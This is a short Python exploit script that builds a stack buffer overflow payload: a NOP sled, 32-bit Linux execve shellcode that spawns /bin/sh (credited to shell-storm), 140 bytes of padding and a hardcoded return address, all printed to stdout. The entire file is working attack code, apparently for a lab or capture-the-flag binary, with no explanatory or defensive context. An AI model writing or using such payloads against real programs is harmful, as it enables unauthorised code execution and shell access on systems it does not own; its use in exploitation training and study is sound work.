#!/usr/bin/env python

import sys
import struct

# http://shell-storm.org/shellcode/files/shellcode-827.php
shellcode  = "\x90" * 50
shellcode += (
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
)

offset  = "A" * 140
retaddr = struct.pack('<L', 0xbffff710) # address pointing to shellcode

payload = offset + retaddr + shellcode

sys.stdout.write(payload)

